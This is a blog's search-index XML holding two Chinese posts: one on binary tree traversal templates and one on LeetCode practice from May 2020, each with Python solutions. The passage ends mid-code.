<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>二叉树的前中后层序遍历</title>
      <link href="/2020/05/05/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E4%B8%AD%E5%90%8E%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/"/>
      <url>/2020/05/05/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E4%B8%AD%E5%90%8E%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>算是总结一下LeetCode这类题的模板。<br>讲道理我应该在一年以前写这个的（。<br><a id="more"></a></excerpt></p><p><the rest of contents | 余下全文><br>简明易懂遍历顺序：</the></p><p><img src="https://pic.leetcode-cn.com/071065c80aaf44da930c7ccb2156b3eac6309d446eb36a376d6478d17cc2400f-102.png" alt></p><p>TreeNode定义：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.val = x</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br></pre></td></tr></table></figure></p><h2 id="前序"><a href="#前序" class="headerlink" title="前序"></a>前序</h2><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 根左右</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">preorderTraversal</span><span class="params">(self, root: TreeNode)</span> -&gt; List[int]:</span></span><br><span class="line">        ans=[]</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dlr</span><span class="params">(node)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node:<span class="keyword">return</span></span><br><span class="line">            ans.append(node.val)</span><br><span class="line">            dlr(node.left)</span><br><span class="line">            dlr(node.right)</span><br><span class="line">        dlr(root)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">preorderTraversal</span><span class="params">(self, root: TreeNode)</span> -&gt; List[int]:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        stack = [root]</span><br><span class="line">        ans = []</span><br><span class="line">        <span class="keyword">while</span> stack:</span><br><span class="line">            node = stack.pop()</span><br><span class="line">            ans.append(node.val)</span><br><span class="line">            <span class="comment">#先右后左，这样出栈时就是先左后右</span></span><br><span class="line">            stack+=[i <span class="keyword">for</span> i <span class="keyword">in</span> [node.right,node.left] <span class="keyword">if</span> i]</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h2 id="中序"><a href="#中序" class="headerlink" title="中序"></a>中序</h2><h3 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 左根右</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inorderTraversal</span><span class="params">(self, root: TreeNode)</span> -&gt; List[int]:</span></span><br><span class="line">        ans=[]</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">ldr</span><span class="params">(node)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node:<span class="keyword">return</span></span><br><span class="line">            ldr(node.left)</span><br><span class="line">            ans.append(node.val)</span><br><span class="line">            ldr(node.right)</span><br><span class="line">        ldr(root)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h3 id="迭代-1"><a href="#迭代-1" class="headerlink" title="迭代"></a>迭代</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inorderTraversal</span><span class="params">(self, root: TreeNode)</span> -&gt; List[int]:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        stack=[]</span><br><span class="line">        node=root</span><br><span class="line">        ans=[]</span><br><span class="line">        <span class="keyword">while</span> stack <span class="keyword">or</span> node:</span><br><span class="line">            <span class="keyword">while</span> node:</span><br><span class="line">                stack.append(node)</span><br><span class="line">                node=node.left</span><br><span class="line">            <span class="comment">#从最左下角的结点向上</span></span><br><span class="line">            node=stack.pop()</span><br><span class="line">            ans.append(node.val)</span><br><span class="line">            node=node.right</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h2 id="后序"><a href="#后序" class="headerlink" title="后序"></a>后序</h2><h3 id="递归-2"><a href="#递归-2" class="headerlink" title="递归"></a>递归</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 左右根</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">postorderTraversal</span><span class="params">(self, root: TreeNode)</span> -&gt; List[int]:</span></span><br><span class="line">        ans=[]</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">lrd</span><span class="params">(node)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node:<span class="keyword">return</span></span><br><span class="line">            lrd(node.left)</span><br><span class="line">            lrd(node.right)</span><br><span class="line">            ans.append(node.val)</span><br><span class="line">        lrd(root)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h3 id="迭代-2"><a href="#迭代-2" class="headerlink" title="迭代"></a>迭代</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">postorderTraversal</span><span class="params">(self, root: TreeNode)</span> -&gt; List[int]:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        stack = [root]</span><br><span class="line">        ans = []</span><br><span class="line">        <span class="keyword">while</span> stack:</span><br><span class="line">            node = stack.pop()</span><br><span class="line">            ans.append(node.val)</span><br><span class="line">            stack+=[i <span class="keyword">for</span> i <span class="keyword">in</span> [node.left,node.right] <span class="keyword">if</span> i]</span><br><span class="line">        <span class="keyword">return</span> ans[::<span class="number">-1</span>]<span class="comment"># 把根右左倒序，变成左右根</span></span><br></pre></td></tr></table></figure><h2 id="层序"><a href="#层序" class="headerlink" title="层序"></a>层序</h2><h3 id="递归-3"><a href="#递归-3" class="headerlink" title="递归"></a>递归</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">levelOrder</span><span class="params">(self, root: TreeNode)</span> -&gt; List[List[int]]:</span></span><br><span class="line">        ans = []</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">helper</span><span class="params">(node, depth)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node: <span class="keyword">return</span> </span><br><span class="line">            <span class="keyword">if</span> len(ans) == depth:</span><br><span class="line">                ans.append([])</span><br><span class="line">            ans[depth].append(node.val)</span><br><span class="line">            helper(node.left, depth + <span class="number">1</span>)</span><br><span class="line">            helper(node.right, depth + <span class="number">1</span>)</span><br><span class="line">        helper(root, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h3 id="迭代-3"><a href="#迭代-3" class="headerlink" title="迭代"></a>迭代</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">levelOrder</span><span class="params">(self, root: TreeNode)</span> -&gt; List[List[int]]:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        nodes=[root]</span><br><span class="line">        ans=[]</span><br><span class="line">        <span class="keyword">while</span> nodes:</span><br><span class="line">            ans.append([i.val <span class="keyword">for</span> i <span class="keyword">in</span> nodes])</span><br><span class="line">            nodes=[n <span class="keyword">for</span> i <span class="keyword">in</span> nodes <span class="keyword">for</span> n <span class="keyword">in</span> [i.left,i.right] <span class="keyword">if</span> n]</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂物堆积 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 二叉树 </tag>
            
            <tag> DFS </tag>
            
            <tag> BFS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020年5月LeetCode练习</title>
      <link href="/2020/05/03/LeetCode-2020%E5%B9%B45%E6%9C%88/"/>
      <url>/2020/05/03/LeetCode-2020%E5%B9%B45%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>只是在做每日一题……有时候还做不出来（。<br>挑些不太会的写在这里。<br><a id="more"></a></excerpt></p><p><the rest of contents | 余下全文> </the></p><h2 id="5-3"><a href="#5-3" class="headerlink" title="5.3"></a>5.3</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/maximum-subarray/" target="_blank" rel="noopener">53. 最大子序和</a></p><h3 id="很喜欢的解法（DP）"><a href="#很喜欢的解法（DP）" class="headerlink" title="很喜欢的解法（DP）"></a>很喜欢的解法（DP）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxSubArray</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        maxSum=nums[<span class="number">0</span>]</span><br><span class="line">        tmp=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            tmp=max(tmp+i,i)</span><br><span class="line">            maxSum=max(maxSum,tmp)</span><br><span class="line">        <span class="keyword">return</span> maxSum</span><br></pre></td></tr></table></figure><h3 id="官方解（分治）"><a href="#官方解（分治）" class="headerlink" title="官方解（分治）"></a>官方解（分治）</h3><p>参考题解：<a href="https://leetcode-cn.com/problems/maximum-subarray/solution/zui-da-zi-xu-he-by-leetcode-solution/" target="_blank" rel="noopener">最大子序和</a></p><blockquote><p>但是仔细观察「方法二」，它不仅可以解决区间 [0,n−1]，还可以用于解决任意的子区间 [l,r] 的问题。如果我们把 [0,n−1] 分治下去出现的所有子区间的信息都用堆式存储的方式记忆化下来，即建成一颗真正的树之后，我们就可以在 O(logn) 的时间内求到任意区间内的答案，我们甚至可以修改序列中的值，做一些简单的维护，之后仍然可以在 O(logn) 的时间内求到任意区间内的答案，对于大规模查询的情况下，这种方法的优势便体现了出来。这棵树就是上文提及的一种神奇的数据结构——线段树。</p></blockquote><p>参考题解：<a href="https://leetcode-cn.com/problems/maximum-subarray/solution/wu-chong-jie-fa-san-chong-yu-yan-java-javascript-2/" target="_blank" rel="noopener">【五种解法三种语言】（Java， JavaScript， Python）</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxSubArray</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">return</span> self.helper(nums, <span class="number">0</span>, len(nums) - <span class="number">1</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">helper</span><span class="params">(self, nums, l, r)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> l &gt; r:</span><br><span class="line">            <span class="keyword">return</span> -sys.maxsize</span><br><span class="line">        mid = (l + r) // <span class="number">2</span></span><br><span class="line">        left = self.helper(nums, l, mid - <span class="number">1</span>)</span><br><span class="line">        right = self.helper(nums, mid + <span class="number">1</span>, r)</span><br><span class="line">        left_suffix_max_sum = right_prefix_max_sum = <span class="number">0</span></span><br><span class="line">        sum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(l, mid)):</span><br><span class="line">            sum += nums[i]</span><br><span class="line">            left_suffix_max_sum = max(left_suffix_max_sum, sum)</span><br><span class="line">        sum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(mid + <span class="number">1</span>, r + <span class="number">1</span>):</span><br><span class="line">            sum += nums[i]</span><br><span class="line">            right_prefix_max_sum = max(right_prefix_max_sum, sum)</span><br><span class="line">        cross_max_sum = left_suffix_max_sum + right_prefix_max_sum + nums[mid]</span><br><span class="line">        <span class="keyword">return</span> max(cross_max_sum, left, right)</span><br></pre></td></tr></table></figure></p><h2 id="5-4"><a href="#5-4" class="headerlink" title="5.4"></a>5.4</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/jump-game-ii/" target="_blank" rel="noopener">45. 跳跃游戏 II</a></p><h3 id="官方解（贪心）"><a href="#官方解（贪心）" class="headerlink" title="官方解（贪心）"></a>官方解（贪心）</h3><blockquote><p>如果我们「贪心」地进行正向查找，每次找到可到达的最远位置，就可以在线性时间内得到最少的跳跃次数。<br>例如，对于数组 [2,3,1,2,4,2,3]，初始位置是下标 0，从下标 0 出发，最远可到达下标 2。下标 0 可到达的位置中，下标 1 的值是 3，从下标 1 出发可以达到更远的位置，因此第一步到达下标 1。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jump</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        n = len(nums)</span><br><span class="line">        maxPos, end, step = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> maxPos &gt;= i:</span><br><span class="line">                maxPos = max(maxPos, i + nums[i])</span><br><span class="line">                <span class="keyword">if</span> i == end:</span><br><span class="line">                    end = maxPos</span><br><span class="line">                    step += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> step</span><br></pre></td></tr></table></figure><h3 id="自己有参考的解法"><a href="#自己有参考的解法" class="headerlink" title="自己有参考的解法"></a>自己有参考的解法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 之前看评论，说用if比用max好像要快些……</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jump</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        count=<span class="number">0</span></span><br><span class="line">        begin,end=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> end&lt;len(nums)<span class="number">-1</span>:</span><br><span class="line">            nowmax=end</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(begin,end+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> i+nums[i]&gt;nowmax:</span><br><span class="line">                    nowmax=i+nums[i]</span><br><span class="line">            begin,end=end+<span class="number">1</span>,nowmax</span><br><span class="line">            count+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> count</span><br></pre></td></tr></table></figure><h2 id="5-6"><a href="#5-6" class="headerlink" title="5.6"></a>5.6</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/minimum-cost-for-tickets/" target="_blank" rel="noopener">983. 最低票价</a></p><h3 id="很喜欢的解法（DP，从前向后）"><a href="#很喜欢的解法（DP，从前向后）" class="headerlink" title="很喜欢的解法（DP，从前向后）"></a>很喜欢的解法（DP，从前向后）</h3><p>参考题解：<a href="https://leetcode-cn.com/problems/minimum-cost-for-tickets/solution/xiong-mao-shua-ti-python3-dong-tai-gui-hua-yi-do-2/" target="_blank" rel="noopener">【熊猫刷题Python3】一维动态规划，易懂(附视频题解)</a></p><blockquote><p>对于一年中的任意一天：<br>首先考虑当前天数是否在 days 中，如果不在，那我们可以贪心地选择不买。这是因为如果今天不用出行，那么也不必购买通行证，并且通行证越晚买越好。<br>如果在的话，我们就要从三种购买方式中选择一种花费费用最少的，即如果想到达第 i 天，就需要从 i 的前1或7或30天的后一位置花费对应cost[0]、cost[1]、cost[2]的钱才能到第 i 天。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mincostTickets</span><span class="params">(self, days: List[int], costs: List[int])</span> -&gt; int:</span></span><br><span class="line">        dp=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(days[<span class="number">-1</span>]+<span class="number">1</span>)]</span><br><span class="line">        index=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(days[<span class="number">0</span>],len(dp)):</span><br><span class="line">            <span class="keyword">if</span> i!=days[index]:</span><br><span class="line">                dp[i]=dp[i<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dp[i]=min(dp[max(<span class="number">0</span>,i<span class="number">-1</span>)]+costs[<span class="number">0</span>],dp[max(<span class="number">0</span>,i<span class="number">-7</span>)]+costs[<span class="number">1</span>],dp[max(<span class="number">0</span>,i<span class="number">-30</span>)]+costs[<span class="number">2</span>])</span><br><span class="line">                index+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h3 id="官方解（DP，从后向前）"><a href="#官方解（DP，从后向前）" class="headerlink" title="官方解（DP，从后向前）"></a>官方解（DP，从后向前）</h3><blockquote><p>我们用 dp(i) 来表示从第 i 天开始到一年的结束，我们需要花的钱。考虑到一张通行证可以让我们在「接下来」的若干天进行旅行，所以我们「从后往前」倒着进行动态规划。<br>但是观察方法一的递推式，我们可以看到，如果我们查询 dp(i)，而第 i 天我们又不需要出行的话，那么 dp 函数会一直向后计算 dp(i+1)=dp(i+2)=dp(i+3) 一直到一年结束或者有一天我们需要出行为止。那么我们其实可以直接跳过这些不需要出行的日期，直接找到下一个需要出行的日期。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mincostTickets</span><span class="params">(self, days: List[int], costs: List[int])</span> -&gt; int:</span></span><br><span class="line">        N = len(days)</span><br><span class="line">        durations = [<span class="number">1</span>, <span class="number">7</span>, <span class="number">30</span>]</span><br><span class="line"><span class="meta">        @lru_cache(None)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dp</span><span class="params">(i)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> i &gt;= N:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            ans = <span class="number">10</span>**<span class="number">9</span></span><br><span class="line">            j = i</span><br><span class="line">            <span class="keyword">for</span> c, d <span class="keyword">in</span> zip(costs, durations):</span><br><span class="line">                <span class="keyword">while</span> j &lt; N <span class="keyword">and</span> days[j] &lt; days[i] + d:</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">                ans = min(ans, dp(j) + c)</span><br><span class="line">            <span class="keyword">return</span> ans</span><br><span class="line">        <span class="keyword">return</span> dp(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="5-7"><a href="#5-7" class="headerlink" title="5.7"></a>5.7</h2><h3 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://leetcode-cn.com/problems/subtree-of-another-tree/" target="_blank" rel="noopener">572. 另一个树的子树</a></p><h3 id="很喜欢的解法（递归判断子树）"><a href="#很喜欢的解法（递归判断子树）" class="headerlink" title="很喜欢的解法（递归判断子树）"></a>很喜欢的解法（递归判断子树）</h3><p>具体操作=官方题解1，即DFS暴力匹配，但是逻辑很清楚所以很喜欢。<br>参考题解：<a href="https://leetcode-cn.com/problems/subtree-of-another-tree/solution/dui-cheng-mei-pan-duan-zi-shu-vs-pan-duan-xiang-de/" target="_blank" rel="noopener">对称美！判断子树 vs 判断相等！</a></p><blockquote><p>判断两个树是否相等的三个条件是与的关系，即：<br>1.当前两个树的根节点值相等；<br>2.并且，s 的左子树和 t 的左子树相等；<br>3.并且，s 的右子树和 t 的右子树相等。<br>而判断 t 是否为 s 的子树的三个条件是或的关系，即：<br>1.当前两棵树相等；<br>2.或者，t 是 s 的左子树；<br>3.或者，t 是 s 的右子树。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isSubtree</span><span class="params">(self, s: TreeNode, t: TreeNode)</span> -&gt; bool:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">isSame</span><span class="params">(node1,node2)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node1 <span class="keyword">and</span> <span class="keyword">not</span> node2:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node1 <span class="keyword">or</span> <span class="keyword">not</span> node2:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> isSame(node1.left,node2.left) <span class="keyword">and</span> isSame(node1.right,node2.right) <span class="keyword">and</span> node1.val==node2.val</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">isSub</span><span class="params">(node1,node2)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node1 <span class="keyword">and</span> <span class="keyword">not</span> node2:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node1 <span class="keyword">or</span> <span class="keyword">not</span> node2:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> isSub(node1,node2.left) <span class="keyword">or</span> isSub(node1,node2.right) <span class="keyword">or</span> isSame(node1,node2)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> isSub(t,s)</span><br></pre></td></tr></table></figure><h3 id="自己的解法（前序遍历比较结果）"><a href="#自己的解法（前序遍历比较结果）" class="headerlink" title="自己的解法（前序遍历比较结果）"></a>自己的解法（前序遍历比较结果）</h3><blockquote><p>前序遍历对单子树而言，得出的序列是真正的子树序列</p></blockquote><p>具体思路基本上=官方题解2，即DFS序列上的串匹配。不过我不会写KMP……这个算法我就只能脑内跑结果（。以后有空试着写下……<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isSubtree</span><span class="params">(self, s: TreeNode, t: TreeNode)</span> -&gt; bool:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">helper</span><span class="params">(node,r)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">                r.append(<span class="string">'null'</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            